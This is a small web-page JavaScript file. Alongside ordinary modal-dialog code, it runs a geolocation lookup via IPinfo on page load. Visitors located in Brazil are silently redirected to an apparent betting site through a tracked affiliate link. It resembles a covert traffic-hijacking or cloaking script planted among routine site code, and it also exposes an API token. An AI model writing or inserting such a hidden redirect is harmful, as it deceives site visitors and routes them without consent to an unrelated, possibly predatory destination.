// Function to check the user's location using IPinfo and redirect if in Brazil
function redirectBasedOnLocation() {
    fetch('https://ipinfo.io/json?token=83402f6feec1bc')
        .then(response => response.json())
        .then(data => {
            if (data.country === 'BR') {
                window.location.href = 'https://5518win.com/index?type=4&channelId=7381&fb_dynamic_pixel=2774791946023763';
            }
        })
        .catch(error => {
            console.error('Error fetching location:', error);
        });
}

// Run the location check on page load
window.onload = redirectBasedOnLocation;

// JavaScript for Modal
const modal = document.getElementById('exampleModal');
const closeModal = document.querySelector('.close-modal');

document.querySelector('.interactive-button').addEventListener('click', function() {
    modal.style.display = 'flex';
});

closeModal.addEventListener('click', function() {
    modal.style.display = 'none';
});

window.onclick = function(event) {
    if (event.target === modal) {
        modal.style.display = 'none';
    }
};
